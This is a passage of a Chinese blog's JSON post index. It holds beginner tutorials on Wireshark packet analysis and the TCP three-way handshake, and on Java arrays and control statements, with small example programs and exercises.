PHP 正则表达式[参见本站博客：PHP-正则表达式]\n\n&emsp;&emsp;\n三、 PHP 文件系统[参见本站博客：PHP-文件系统]\n\n\n&emsp;&emsp;\n四、 PHP 文件上传[参见本站博客：PHP-文件上传]\n\n\n&emsp;&emsp;\n五、 MySQL入门[参见本站博客：MySQL入门]\n\n\n&emsp;&emsp;\n六、 PHP操作MySQL数据库[参见本站博客：PHP操作MySQL数据库]\n\n\n&emsp;&emsp;\n七、 PHP会话管理和控制[参见本站博客：PHP-会话管理和控制]\n\n\n\n\n","thumbnail":"https://i.loli.net/2019/02/13/5c6439f91f9fe.jpg","plink":"https://Directoree.github.io/post/PHP-1/"},{"title":"Wireshark简单介绍和数据包分析","date":"2019-01-19T08:39:57.000Z","updated":"2019-01-19T12:20:35.505Z","content":"&ensp;&ensp;\nWireshark-Acquaintance\n\n&emsp;&emsp;\n前言Wireshark是一款世界范围最广、最好用的网络封包分析软件，功能强大，界面友好直观，操作起来非常方便。它的创始人是Gerald Combs，前身是Ethereal，作为开源项目经过众多开发者的完善它已经成为使用量最大的安全工具之一。在CTF中也经常会使用wireshark进行流量数据包分析，可以快速检测网络通讯数据，获取最为详细的网络封包资料。Wireshark使用WinPCAP作为接口，直接与网卡进行数据报文交换。用户将在图形界面中浏览这些数据，实时监控TCP、session等网络动态，轻松完成网络管理工作。\n\n什么是数据包分析数据包嗅探或协议分析:指捕获和解析网络上传输的数据的过程，以便更好地了解网络上正在发生的事情。\n\nTCP/IP四层模型：1.应用层：最高的一层，直接面对用户，各种程序都是基于这一层，主要作用是处理传输层提交的信息，与用户交换，并把信息传到下层发送。2.传输层：主要作用对数据包的分割、重组、连接、管理、排序、重传等等，以及标记逻辑端口号—常见协议：TCP、UDP; 端口0~ 65535个端口，只是应该标识，方便管理（such as:21端口是FTP程序，80端口是HTTP程序，4000端口是QQ）。3.网络层：主要作用是实现与远程设备的连接，是TCP/IP模型中最重要的一层，封装为 IP头部。封装中的重要部分为IP地址，每台设备唯一。4.链路层：主要功能在两个网络实体之间提供数据链路链接，最常见的是以太网和IEEE 802封装，封装中有一个重要的部分就是MAC地址（网卡物理地址）。\n\n\nTCP协议：可靠，面向连接，效验数据，超时重传，有序号，保证数据完整有序到达，但是协议复杂速度稍慢。（适合文件传输和网页浏览，对数据完整有序要求比较高的场合）UDP协议:不可靠，仅发送数据，不保证数据完整有序到达，协议简单速度快。（适合DNS查询，视频聊天，对数据完整有序要求比较低，但对数据即使性要求比较高的场合）\n\nwireshark界面介绍wireshark是捕获机器上的某一块网卡的网络包，当你的机器上有多块网卡的时候，你需要选择一个网卡。 点击 Caputre-&gt;Interfaces. 出现下面对话框，选择正确的网卡。然后点击Start按钮, 开始抓包WireShark 主要分为这几个界面1. Display Filter(显示过滤器)，用于过滤。2. Packet List Pane(封包列表)，显示捕获到的封包，有源地址和目标地址，端口号。 颜色不同，代表3. Packet Details Pane(封包详细信息)，显示封包中的字段。4. Dissector Pane(16进制数据)。5. Miscellanous(地址栏，杂项)。\n\n\n&emsp;&emsp;\n1. Display Filter(显示过滤器)\n使用过滤是非常重要的， 初学者使用wireshark时，将会得到大量的冗余信息，在几千甚至几万条记录中，以至于很难找到自己需要的部分。搞得晕头转向。过滤器会帮助我们在大量的数据中迅速找到我们需要的信息。过滤器有两种:&emsp;&emsp;&emsp;一种是显示过滤器，就是主界面上那个，用来在捕获的记录中找到所需要的记录&emsp;&emsp;&emsp;一种是捕获过滤器，用来过滤捕获的封包，以免捕获太多的记录。在Capture-&gt;Capture Filters中设置.&emsp;保存过滤在Filter栏上，填好Filter的表达式后，点击 + 按钮，取个名字。比如 “test”。点击OK后Filter栏上就多了个”test” 的按钮。\n\n\n&emsp;\n过滤表达式的规则表达式规则&emsp;&emsp;1. 协议过滤 比如TCP，只显示TCP协议。&emsp;&emsp;2. IP 过滤 比如 ip.src ==192.168.1.102显示源地址为192.168.1.102，ip.dst==192.168.1.102, 目标地址为192.168.1.102&emsp;&emsp;3. 端口过滤 tcp.port ==80, 端口为80的 tcp.srcport == 80, 只显示TCP协议的愿端口为80的。&emsp;&emsp;4. Http模式过滤 http.request.method==”GET”, 只显示HTTP GET方法的。&emsp;&emsp;5. 逻辑运算符为 AND/ OR 常用的过滤表达式\n\n过滤表达式                                                      用途\nhttp                                                    只查看HTTP协议的记录\nip.src==192.168.1.102 or ip.dst==192.168.1.102      源地址或者目标地址是192.168.1.102\n\n&emsp;&emsp;\n2. 封包列表(Packet List Pane)封包列表的面板中显示，编号，时间戳，源地址，目标地址，协议，长度，以及封包信息。 你可以看到不同的协议用了不同的颜色显示。你也可以修改这些显示颜色的规则，View-&gt;ColoringRules。\n\n\n&emsp;&emsp;\n3. Packet Details Pane(封包详细信息)Packet Details Pane(封包详细信息)，这个面板是我们最重要的，用来查看协议中的每一个字段。各行信息分别为：Frame: 物理层的数据帧概况Ethernet II: 数据链路层以太网帧头部信息Internet Protocol Version 4: 互联网层IP包头部信息Transmission Control Protocol: 传输层T的数据段头部信息，此处是TCPHypertext Transfer Protocol: 应用层的信息，此处是HTTP协议\n\n\nTCP包的具体内容从下图可以看到wireshark捕获到的TCP包中的每个字段。\n\n\n&emsp;\nTCP三次握手看到这， 基本上对wireshak有了初步了解， 现在我们看一个TCP三次握手的实例三次握手过程为：\n\n\n我们用wireshark实际分析下三次握手的过程。 打开wireshark, 打开浏览器输入 http://www.cr173.com 在wireshark中输入http过滤， 然后选中GET /tankxiao HTTP/1.1的那条记录，右键然后点击”Follow TCP Stream”, 这样做的目的是为了得到与浏览器打开网站相关的数据包，将得到如下图：\n\n\n图中可以看到wireshark截获到了三次握手的三个数据包。第四个包才是HTTP的， 这说明HTTP的确是使用TCP建立连接的。\n\n&emsp;\n第一次握手数据包客户端发送一个TCP，标志位为SYN，序列号为0， 代表客户端请求建立连接。 如下图\n\n\n&emsp;\n第二次握手的数据包服务器发回确认包, 标志位为 SYN,ACK. 将确认序号(Acknowledgement Number)设置为客户的SYN加1以.即0+1=1, 如下\n\n\n&emsp;\n第三次握手的数据包客户端再次发送确认包(ACK) SYN标志位为0,ACK标志位为1.并且把服务器发来ACK的序号字段+1,放在确定字段中发送给对方.并且在数据段放写ISN的+1, 如下图\n\n\n&emsp;就这样通过了TCP三次握手，建立了连接。  参考文章\n\n\n","thumbnail":"https://i.loli.net/2019/01/19/5c42e330868ec.jpg","plink":"https://Directoree.github.io/post/Wireshark-1/"},{"title":"Java数组(3.9)","date":"2019-01-13T03:30:23.000Z","updated":"2019-01-19T08:37:34.750Z","content":"&ensp;&ensp;\n数组\n\n&emsp;&emsp;\n一、 一维数组  数组： 相同类型的数据元素按顺序组成的一种线性表，元素在数组中的相对位置由下标来指定。数组中的每个元素通过数组名加下标进行引用。 数组有什么用处？ 例：定义100个int型变量，求这100个变量的和。int x1,x2,x3…x100;int sum;sum=x1+x2+…+x100;这样程序很复杂。例：定义100个int型变量，求这100个变量的和。有了数组后，可以这样编程：int [] x=new int[100];int sum=0;for(int i=0;i&lt;100;i++){     sum=sum+x[i];}这样使得程序编写方便很多。 注意： Java中，数组是独立的类，有自身的方法，不只是变量的集合。在Java里创建一个数组，需要做如下的工作：   （1）说明一个变量来存放该数组。   （2）建立一个新的数组对象（即创建数组空间）并把它赋给这个数组变量。   （3）在该数组中存储信息。\n\n&emsp;&emsp; ↓↓ \n\n例如：String list[ ]=new String[3];             list[0]=“one”;             list[1]=“two”;\n\n&emsp;&emsp;\n1.1  一维数组的说明同其他类变量一样，在使用数组前必须先说明它，一维数组说明的格式如下：&emsp;       类型    数组名[ ]；    或 类型[ ]    数组名；\n\n\n例如：int list[ ];            int[] list;            String[] args;            String args[];\n\n&emsp;&emsp;\n1.2  创建数组空间创建数组空间必须声明数组的长度，以确定所开辟的内存空间的大小，在Java中实际上就是通过new创建一个新的数组对象并把它赋给这个数组变量。其语法格式如下：&emsp;&emsp;&emsp;数组名=new 数组元素类型[数组元素个数]例如：int[] list;   list=new int[3];数组的说明和构造合并在一起，其语法格式如下：&emsp;&emsp;&emsp;          类型 数组名[ ]=new 数组元素类型[数组元素个数]；]例如：int list[ ]=new int[3];\n\n&emsp;&emsp;\n1.3  数组的初始化1. 数组的初始化方式有两种：(1) 像初始化简单类型一样自动初始化数组，即在说明数组的同时进行初始化；&emsp;&emsp;     int a[]={1,2,3,4}(2) 先定义数组，然后为每个元素赋值。例如：&emsp;&emsp;     int b[]=new int[3];&emsp;&emsp;     b[0]=8;b[1]=9;&emsp;2. 这样初始化也可以!另一种形式1：int[] a=new int[]{1,2,3,4};&emsp;&emsp; 等价于: int[] a={1,2,3,4}{}中的元素个数决定了[]中的元素个数。{}中的元素取值决定了数组a各个元素的取值。另一种形式2：int[] a;a=new int[]{1,2,3,4};等价于：int[] a=new int[3];&emsp;&emsp;&emsp;&emsp; a[0]=1;a[1]=2;a[2]=3;&emsp;&emsp;&emsp;&emsp; a[3]=4\n\n\n但是这样定义是错误的：int[] a;a={1,2,3,4};\n\n定义数组要注意：(1) 不能这样定义数组：&emsp;&emsp;&emsp;&emsp;          int a[5];(2)不能这样初始化数组：&emsp;&emsp;&emsp;&emsp;          int[] a;   a={1,2,3,4};(3)使用new 创建数组之后，数组中的每个元素被自动初始化为0。&emsp;&emsp;&emsp;&emsp;         int [] a=new int[10];&emsp;&emsp;&emsp;&emsp;         for(int i=0;i&lt;10;i++)&emsp;&emsp;&emsp;&emsp;           { System.out.println(“a[“+i+”]=”+a[i]);&emsp;&emsp;&emsp;&emsp;           }\n\n&emsp;&emsp;\n1.4  数组元素的使用数组元素的表示方式为：&emsp;&emsp;&emsp;&emsp; 数组名[下标]&emsp;使用数组时要注意：（1）数组越界异常:Java在对数组元素操作时会对数组下标进行越界检查，以保证安全性。若在Java程序中超出了对数组下标的使用范围则在运行此程序时将出现如下错误信息：&emsp;&emsp;    Exception in thread “main”             Java.lang.ArrayIndexOutOfBoundsException如下的错误即数组越界：int x[]={1,2,3,4};System.out.println(x[4]);（2）每个数组都有一个属性length来指明其长度，字符串String用length()。&emsp;&emsp;         list.length;\n\n（3）空指针异常\n数组长度lengh的使用\nint x[]={1,2,3,4};                  int x[]={1,2,3,4};\nfor(int i=0;i&lt;100;i++)              for(int i=0;i&lt;x.length;i++)    \n{  System.out.println(x[i]);        { System.out.println(x[i]); \n}                                   }\n\n空指针如下使用会导致错误\nint x[]=new int[10];\nx=null;\nx[0]=1;\n\n&emsp;&emsp;\n1.5  一维数组使用举例[例3-12] 练习数组的创建和使用\n[例3-13] 练习数组越界\n[例3-14] 数组作为函数的参数\n\n[例3-12] HalfDollars.java 练习数组的创建与使用\nclass HalfDollars{\n    public static void main(String[] args){\n        int[] denver={15000006,18810000,20752110};\n        int[] philadelphia=new int[denver.length];\n        int[] total=new int[denver.length];\n        int average;\n\n        philadelphia[0]=15020000;\n        philadelphia[1]=18709000;\n        philadelphia[2]=21348000;\n\n        total[0]=denver[0]+philadelphia[0];\n        total[1]=denver[1]+philadelphia[1];\n        total[2]=denver[2]+philadelphia[2];\n        average=(total[0]+total[1]+total[2])/3;\n        System.out.println(\"1993 production:\"+total[0]);\n        System.out.println(\"1994 production:\"+total[1]);\n        System.out.println(\"1995 production:\"+total[2]);\n        System.out.println(\"Average production:\"+average);\n      }\n}\n运行结果：\n1993 production:30020006\n1994 production:37519000\n1995 production:42100110\nAverage production:36546372\n\n\n[例3-13] ChoiceSort.java 数组的越界\npublic class ChoiceSort\n{\n    public static void main(String arg[])\n     {   int i,min;\n          int str[]={2,13,41,58,32};\n          for(i=0;i&lt;5;i++)\n          {\n             min=i;\n            for(int j=i+1;j&lt;6;j++)\n             {      \n               if(str[min]>str[j])\n                  {\n                  int at=str[j];\n                  str[j]=str[min];\n                  str[min]=at;\n                 }\n             }  \n          }\n        for(i=0;i&lt;5;i++)\n        System.out.println(str[i]+\" \");\n    }\n}\n运行结果：\n程序没能正常运行，抛出了“java.lang.ArrayIndexOutOfBoundsException”异常。 \n\n\n例[3-14] test.java 数组作为函数的参数\nclass test  \n{   static void change(int [] a)  //输出a[0]和a[1]中大的那个数\n    {    int t;\n         if(a[0]&lt;a[1])\n         {        t=a[0];\n                  a[0]=a[1];\n                  a[1]=t;\n         }\n         System.out.println(a[0]);\n    }\n    public static void main(String args[])\n   {    int x[]={5,12};\n        change(x);     //调用过后，数组x可能发生变化\n   }\n}\n\n\n\n&emsp;&emsp;\n二、 二维数组 Java中的多维数组实际上是数组的数组。不一定是规则的矩阵数组。多维数组：数组的数组，例如，二维数组为一个特殊的一维数组，其每个元素又是一个一维数组\n\n\n&emsp;&emsp;\n二维数组说明的格式为：&emsp;  类型    数组名[ ][ ]；      或                  类型[ ][ ]     数组名；例如，说明一个整型的二维数组如下：&emsp;    int intArray[ ][ ];或 int[ ][ ] intArray;\n\n&emsp;\n二维数组的创建：直接为每一维分配空间，如：&emsp;       int a[ ][ ]=new int[2][3];\n\n\n\n\n\na[0][0]\na[0][1]\na[0][2]\n\n\na[1][0]\na[1][1]\na[1][2]\n\n\n\n&emsp;\n从最高维开始，分别为每一维分配空间，如：int b[ ][ ]=new int[2][ ];b[0]=new int[3];b[1]=new int[5];\n\n\n\n\n\nb[0][0]\nb[0][1]\nb[0][2]\n\n\nb[1][0]\nb[1][1]\nb[1][2]\nb[1][3]\nb[1][4]\n\n\n\n&emsp;\n元素的初始化：（1）直接对每个元素进行赋值。（2）在说明数组的同时进行初始化。\n\n例如：  int[][] a=new int[3][2]：\n              a[0][0]=2； a[0][1]=3\n              a[1][0]=1； a[1][1]=5\n              a[2][0]=3； a[2][1]=4  \n等价于：int a[ ][ ]={{2,3},{1,5},{3,4}}; \n\n&emsp;\n总结：与数组操作相关的系统函数（1）使用Arrays.sort来对数组排序int x[]=new int[]{3,2,1,4};java.util.Arrays.sort(x);  //对数组x内的元素进行排序（升序）for(int i=0;i &lt; x.length;i++){      System.out.println(x[i]);}（2）使用Arrays.binarySearch函数对数组进行二分查找int [] x=new int[]{2,5,1,6,8,3};java.util.Arrays.sort(x);System.out.println(java.util.Arrays.binarySearch(x,1));   //二分查找，在数组x中查找1，输出0 ;如果没找到，则会输出一个&lt;0的数（3）使用System.arraycopy函数拷贝数组int [] x;x=new int[]{3,1,2,4};int [] y;y=new int[4];System.arraycopy(x,0,y,0,4);//将数组x内的 4个元素拷贝给数组y（4）使用Ayyars.fill函数填充数组int [] x;x=new int[]{3,1,2,4};java.util.Arrays.fill(x,7);    //数组x中的4个元素都改为7\n\n\n\n&emsp;&emsp;&emsp;&emsp;\n","thumbnail":"https://i.loli.net/2019/01/13/5c3ab12a2922b.png","plink":"https://Directoree.github.io/post/Java-Language-2-4/"},{"title":"Java简单语句、复合语句、控制语句(3.7-3.8)","date":"2019-01-12T10:12:40.000Z","updated":"2019-01-19T08:37:30.463Z","content":"&ensp;&ensp;\n简单语句和复合语句 &amp; 控制语句\n\n&emsp;&emsp;\n一、 简单语句和复合语句 1.1  变量定义语句 变量定义语句用来定义一个变量，基本格式为：&emsp;&emsp;            类型 变量名1, 变量名2…；       例：char c=‘a’;  int i,j=1;\n\n1.2  赋值语句  赋值语句是将表达式的值赋给变量，其格式为：&emsp;&emsp;变量=表达式；      例： char c;  c=‘a’;\n\n1.3  方法调用语句  方法调用语句的一般形式为：&emsp;&emsp;对象.方法名( 实参数列表 );      例如  System.out.println(“Example!”);\n\n1.4  空语句  方法调用语句的一般形式为：&emsp;&emsp;；//这是一条空语句\n\n1.5  标准输入输出（I/O） 输入和输出是Java程序的重要组成部分,它提供了人机交互的手段，它们属于方法调用语句。具体使用方法参考本博客IO使用方法。1. 输入输出       输入是指把需要加工的数据放到程序中,read       输出则把程序处理的结果呈现给用户,write2. 标准输入输出       一般用键盘作为标准的输入设备       显示器则是标准的输出设备通过System.in和System.out对象分别与键盘和显示器发生联系进行输入和输出。\n\n&emsp;\n📒1. 标准输出System.out对象System.out对象中包含的最常用的方法是：   println(参数) 向标准输出设备(显示器)打印一行文本并换行  print(参数) 向标准输出设备(显示器)打印一行文本但不换行   参数类型：boolean , char char[] ,double ,float ,int ,                  long ,  Object,String  例如：System.out.println(“Example”);           System.out.print(“Input Name”);           int x=2; System.out.print(x);\n\n&emsp;\n📒2. 标准输入System.in对象System.in是字节流,作用是从标准输入读一个字节,常用的方法如下:   int read()&emsp;           从流中读取一个字节并将该字节作为整数返回,若没有数据则返回-1    int read(byte b[])&emsp; 从流中读取多个字节放到b中, 返回实际读取到的字节数   int read(byte b[],int off,int len)&emsp; 从流中读取最多len字节的数据, 放到数组b的下标off开始的单元中，返回读取到的字节数\n\n[例3-1] ReadChar.java 从键盘读一个字符\nimport java.io.*;\npublic class ReadChar{\n   public static void main(String args[]){\n    try{\n         char ch=(char)System.in.read(); //将int转换为char\n         System.out.println(ch);    \n         }catch(IOException e){}\n   } \n}\n\n[例3-2] ReadString.java 从键盘读一串字符\nimport java.io.*;    \npublic class ReadString\n{ public static void main(String args[])\n     {  char c;\n         try{\n            do\n           {  c=(char)System.in.read();  //使用循环来从输入流中读取一转字符\n              System.out.print(c);\n            }while(c!='\\n');\n         }catch(IOException e){  }                    \n     }\n}\n\n[例3-3] ReadStringOrInt.java 从键盘读一数字串或一个整数\nimport java.io.*;\nclass ReadStringOrInt{\n    public static void main(String args[]){\n          byte buf[]=new byte[20];  \n          String str;\n           int anInt;         \n          try{    \n               System.in.read(buf);  \n              str=new String(buf)\n              anInt=Integer.parseInt(str.trim()); \n               }\n          catch(Exception e){  }     \n     }\n}\n//要将数字串转换成实数，则： \n  float  f=Float.parseFloat(str.trim());        //转成单精度数\n  double d=Double.parseDouble(str.trim());      //转成双精度数  \n\n\n\n思考：如何接收用户向程序输入的参数?通过System.in通过main（String[] args）中的形参class test{public static void main(String[] args){   System.out.println(args[0]);   System.out.println(args[1]);}}java test s1 s2s1s2\n\n\n\n\n&emsp;\n二、 控制语句句 \n 2.1选择语句\n2.1.1 if-else语句  \n2.1.2 switch语句\n\n\n 2.2循环语句 \n2.2.1 while 语句 \n2.2.2 do-while 语句\n2.2.3 for 语句\n2.2.4 循环的嵌套\n\n\n 2.3跳转语句  \n2.3.1 break语句\n2.3.2 continue语句\n2.3.3 return 语句 \n\n\n\n2.1  选择语句  if-else语句📒if-else语句的语法形式：       if  (布尔表达式)         {    语句块1   }       [ else          {   语句块2      }  ]     若语句块1，语句块2也是if-else语句便形成嵌套\n\n例［3-4］：三个整数a,b,c，要求按从小到大的次序输出\n解题思路：对a,b,c进行排序。先找出a、b、c中最小的，然后比较剩下的两个。\n算法：    \n        ①如果a>b，则将a和b互换（使得a是a、b中小的那个）\n        ②如果a>c，则将a和c互换（使得a是a、b、c中最小的）\n        ③如果b>c，则将b和c互换（最后c最大，b次之，a最小）\n代码如下：\n     if(a>b)\n    {\n          t=a;a=b;b=t;\n     }\n    if(a>c)\n    {\n          t=a;a=c;c=t;\n     }\n    if(b>c)\n    {\n          t=b;b=c;c=t;\n     }\n    System.out.println(a+\"&lt; \" +b+\"&lt; \" +c);   \n\n📒  if–else 语句的嵌套if-else语句中内嵌的语句1或语句2又是if-else语句的情况称为if-else语句的嵌套。如：      if（布尔表达式1）           语句1      else if（布尔表达式2）                 语句2                 …             else if (布尔表达式m)                        语句m                    else  语句n\n\n[例3-5] 求一元二次方程(aX2+bX+c=0)的根：\npublic class roots{\n    public static void main(String args[]){\n        int a,b,c;\n        float x1,x2;\n        int check;\n        a=1;b=-2;c=1;\n        check=b*b-4*a*c;\n        if(check==0){\n            x1=(-b)/(2*a);\n            x2=x1;\n            System.out.println(\"x1=\"+x1);\n            System.out.println(\"x2=\"+x2);\n        }\n     else\n        if (check>0) {\n          x1=(-b+(float)Math.sqrt(check))/(2*a);\n          x2=(-b-(float)Math.sqrt(check))/(2*a);\n          System.out.println(\"x1=\"+x1);\n          System.out.println(\"x2=\"+x2);\n         }\n         else\n         {   /*请自己填写*/   }\n     } }\n\n课堂练习：求最小数\nimport  java.io.*;             \npublic class Min\n{\n    public static void main(String args[]) throws IOException\n { \n   byte buf[]=new byte[20];  \n   String str ;  int a, b, min;    \n   System.out.println(\"请输入二个整数：\");                    \n   System.in.read(buf);        //从键盘读一数字串存于buf中\n   str=new String(buf);              //buf 转换成字符串 \n   a=Integer.parseInt(str.trim());  //数字串转换成整数\n   System.in.read(buf);    str=new String(buf);                   \n   b=Integer.parseInt(str.trim());        \n\n   min=a;\n   if (min>b) min=b;\n   System.out.println(\"最小数是\"+min);\n\n }\n}\n\n&emsp;\n  switch  语句switch语句根据表达式的结果来执行多个可能操作中的一个，它的语法形式如下：\n\n  switch(表达式)\n  {\n   case 常量1：语句1  \n                  [break;]\n   case 常量2：语句2\n                  [break;]\n   …\n   case 常量n：语句n\n                   [break;]\n   [default: 缺省处理语句\n                   break；]    //这儿的break语句不必要\n   }\n\n&emsp;\n注意： “case 常量”只起语句标号的作用，并非在该处进行条件判断。在执行switch语句时，根据switch括号中表达式的值找到匹配的入口标号，就从此标号所标记的语句开始执行下去，不再进行判断，直到遇到break语句为止。\n\n演示有break及没有break的情况\npublic class switchBreak\n{\n      public static void main(String args[])\n     {   …\n         switch(2)\n         { \n          case 1: System.out.println(\"case1\");\n                      break;\n          case 2: System.out.println(\"case2\");\n                      break;\n          case 3: System.out.println(\"case3\");\n                      break;\n          default: System.out.println(\"default\");\n         }\n      }\n}\n\n&emsp;\n使用switch-case必须注意:1. 表达式必须是符合byte,char,short和int类型的表达式,不能是浮点类型或字符串，case子句中常量的类型必须与表达式的类型相容,且每个常量必须不同；2. case后面可以有多条语句，不用加{}；3. default子句是可选的。如果有default，当表达式的值与case子句的值都不匹配时就会执行default分支，如果既没匹配也没default，那就什么也不执行；4. break为跳转语句，表示跳出switch结构，即终止switch语句的执行。如果没有break语句，则switch在执行完一个case分支后，流程控制转移到下一个case继续执行，不再匹配，直到遇到break为止。5. 多个case子句可以共享相同的语句块；6. 通过if-else语句可以实现switch语句所有的功能。但通常使用switch语句更简练，且可读性强，程序的执行效率也高；7. if-else语句可以基于一个范围内的值或一个条件来进行不同的操作，但switch语句中的每个case子句都必须对应一个单值。\n\n[例3-6] 用switch语句判断一个月份属于一年哪个季节(春、夏、秋、冬)。\nclass SwitchDemo{\n public static void main(String args[]) { \n  int month=7;\n  String season;\n  switch (month)     //值为12、1和2时将都执行：season=\"冬季\"; break;\n  { case  12: \n    case  1:\n    case  2:\n      season=\"冬季\";  \n      break;\n    case  3:\n    case  4:\n    case  5:\n      season=\"春季\"；\n      break;\n   case  6:\n   case  7:\n   case  8:  season=\"夏季\"; \n                 break;\n   case  9:\n   case  10:\n   case  11: season=\"秋季\"；\n                 break;\n   default:  season=\"错!\";\n   }\n   System.out.println(\"月份    季节\");\n   System.out.println(month+\"    \"+season);\n }\n}\n该程序运行后输出：月份    季节\n                 7      夏季\n\n&emsp;&emsp;\n2.2  循环语句while  语句  while语句形式如下：&emsp;&emsp;     while (布尔表达式) {语句块}  说明：while：语句的关键字； 布尔表达式：循环条件； 语句块：循环体，是一个语句，若是多个语句则应构成复合语句。 \n\n[例3-7] Sum1.java用while循环语句计算s=1+1/2+1/3+…+1/100\nclass Sum {\n  public static void main(String args[]) {\n    int n=100;　                //循环总数n=100\n    int  i=1;　　     　　      //循环次数，初值为１\n    float s=0;                 //和s为实型\n    while (i&lt;=100) 　　　      //循环条件,循环总数100\n    {\n     s=s+(1.0f/i);            //s增加1/i ,1.0f表示是float型\n     i++;                    //循环次数加１\n    }\n    System.out.println(“s=”+s);\n  }\n}                              \n\n&emsp;&emsp;\ndo-while  语句  do-while语句的语法形式如下：&emsp;&emsp;     do{&emsp;&emsp;                        语句块&emsp;&emsp;                         }while（布尔表达式）;说明：do：语句的关键字； 语句块：循环体，是一个语句，若是多个语句则应构成复合语句； 布尔表达式：循环条件。 \n\n[例3-8] Sum2.java 用do-while循环语句计算s=1+2+3+……100\nclass Sum2{\n    public static void main(String args[]){\n        int i=1;         //循环次数，初值为１\n        int s=0;         //累加和s初值为0\n        do{              //开始无条件循环\n            s=s+i;       //s增加i\n            i++;         //循环次数加１\n        }while(i&lt;=100);  //循环总数100\n        System.out.println(\"s=\"+s);\n    }\n}\n\n&emsp;&emsp;\nfor 语句  for语句的语法形式为：&emsp;&emsp;for（表达式1；表达式2；表达式3）&emsp;&emsp;                  {   语句块&emsp;&emsp;                  }说明：（表达式1；表达式2；表达式3）：循环条件； 语句块：循环体，是一个语句，若是多个语句则应构成复合语句。 for语句的执行过程如下：（1）按表达式1将初值赋给循环控制变量；（2）按表达式2判断循环是否成立，如果成立则执行循环体，否则退出循环；（3）执行一次循环后，执行表达式3修改控制变量。 \n\n[例3-9] sum3.java 编程求S=12+22+…92 \npublic class sum3{\n    public static void main(String args[]){\n        int s=0;\n        for(int i=1;i&lt;=9;i++)\n           s=s+i*i;\n           System.out.println(\"s=\"+s);\n    }\n}\n\nfor语句使用注意：1.  逗号语句分隔的语句系列,被看作一个语句，这样就可以在只能放一个语句的地方放任意多个语句，只须用逗    号将它们分隔开。如：      for ( i=1,j=10;i &lt; j;i++,j–)      {    ……    }2.  表达式1、表达式2及表达式3都可以为空语句(但分号不能省略) 如：         for(  ;  ;  ) { … }     相当于while(true)循环的嵌套：一个循环体内又包含另一个完整的循环结构 ，称为循环的嵌套。内嵌的循环中还可以嵌套循环，这就是多重循环。上述三种循环（while循环，do-while循环和for循环）语句之间可以相互嵌套使用。\n\n[例3-10] 百鸡问题。\n      已知公鸡5元1只，母鸡3元一只，小鸡1元3只，要求用100元刚好买100只鸡，问有多少种采购方案。\n\n     分析: 设变量I、J、K分别代表公鸡数、母鸡数及小鸡数，则应满足下列一些条件:\n① I+J+K=100(只)，I,J,K0;\n② 5I+3J+K/3=100（元）;\n③ 若用100元全部买公鸡，最多只能买20只, 所以I≤20;若全部买母鸡最多只能买33只，所以J≤33; \n  而小鸡数目就是100-I-J;(简化计算)\n     根据以上分析，可编程如下：\n\n\npublic class  Loop_Loop {\n    public static void main(String args[]) {\n      int I,J,K;\n      System.out.println(\" I    J    K \");\n      for  (I=0;I&lt;=20;I++ )\n       { for ( J=0;J&lt;=33;J++)\n            { K=100-I-J;                \n              if (5*I+3*J+K/3.0==100)         //注意“K/3.0”\n              System.out.println(I+\"   \"+J+\"   \"+K);\n            } \n       }\n   }  \n} \n\n&emsp;&emsp;\n2.3  跳转语句break语句  作用：  使程序的流程从一个语句块的内部跳转出来。(1) 从switch语句的分支中跳出来(2) 从循环体内跳出来 \n\n对上述的(1)(2)举例如下：(1) break用于跳出switch语句  \nswitch(grade)\n{ \ncase 'A': \ncase 'B': \ncase 'C': System.out.println(\"及格\\n \"); break;\ncase ‘D’: System.out.println(“不及格\\n \"); break;\n}\n\n习题1：分析该程序的输出结果\nint x=5;\ndo{\n          switch(x%2)\n          {\n                case 1: x--;\n                            break;\n                case 0: x++;\n                            break;\n           }\n           x--;\n           System.out.println(x);\n     }while(x>0);\n运行结果：\n3\n1\n-1\n\n\n\n习题2：分析该程序的输出结果\nint a=5,b=6,i=0,j=0;\nswitch(a)\n{\n        case 5: switch(b)\n                    {\n                          case 5:i++;break;\n                          case 6:j++;break;\n                          default:i++;j++;\n                     }\n         case 6: i++;j++;\n                     break;\n         default: i++;j++;\n}\nSystem.out.println(i+\",\"+j);\n运行结果：\n1,2\n\n&emsp;\n(2) break用于跳出循环体  \n\nbreak可用于跳出for循环、while循环、do while循环。\nint sum=0;      \nfor(int i=1;i&lt;=100;i++)\n{\n      sum=sum+i;\n      if(i==50)break;\n}\nSystem.out.println(sum);    //结果为1275\n\n&emsp;&emsp;\n如果break在多重循环中，只退出break所在的那层循环到外层循环中。  \n\nint sum=0;      \nfor(int i=1;i&lt;=100;i++)\n{\n       sum=sum+i;\n       while(i==50){i=100;break;}\n}\nSystem.out.println(sum);       //结果为1275\n\n&emsp;&emsp;\ncontinue 语句 作用：用来结束所在循环语句块的本次循环注意:continue语句只能在循环语句中使用。\n\n[例3-11] ConDemo.java\npublic class ConDemo{\npublic static void main(String args[]){\n  int index=0;\n  while(index&lt;=99)\n {\n    index+=10;\n           if(index==40)  continue; \n    System.out.println(\"   The index is \"+index);\n        }\n    }\n\n程序运行结果：\n   The index is 10\n   The index is 20\n   The index is 30\n   The index is 50\n   The index is 60\n   The index is 70\n   The index is 80\n   The index is 90\n   The index is 100\n\n&emsp;&emsp;\n循环体中使用break语句和continue语句的区别：Break语句  结束整个循环,不再判断执行循环的条件;Continue语句只结束本次循环,而不是终止整个循环的执行。  \n\n\n&emsp;&emsp;\nreturn 语句  格式：   return  表达式;用途：(1) 结束方法的运行，并返回一个值；(2) 如果该方法没有返回值（void），则return后不能跟表达式。\n\n\n\n例如：  return  0;&emsp;&emsp;&emsp;   return;\n\n\n思考:分析以下程序运行结果\n1. \npublic class ArithmeticOp{\n    public static void main(String args[ ]){\n       int a,b,c;\n       a=b=c=2;\n       a=++b - ++c;     //0 3 3\n       System.out.println（″a=″+a+″b=″+b+″c=″+c）;\n       a =b++ + c++;    //6 4 4\n       System.out.println（″a=″+a+″b=″+b+″c=″+c）;\n       a =b-- + c--;    //8 3 3\n       System.out.println（″a=″+a+″b=″+b+″c=″+c）;\n     }\n}\n\n2.\npublic class TestSwitch{\n    public static void main(String args[ ]){\n       int  x=1,y=2,i=0,j=0;\n       switch(x){\n          case 1: switch(y){\n                   case 1: i++;\n                   break;\n                   case 2: j++;\n                   break;\n                   default:i++;\n                    j++;}           //i=0 j=1\n\n          case 2: i++;\n                  j++;              //i=1 j=2\n                  break;\n          default:i++;\n                  j++;\n       }\n      System.out.println(\"i=\"+i);\n      System.out.println(\"j=\"+j);\n    }                              //i=1\n}                                  //j=2\n\n\n3.\npublic class J_Test{\n  static boolean mb_fun(char c)\n  {    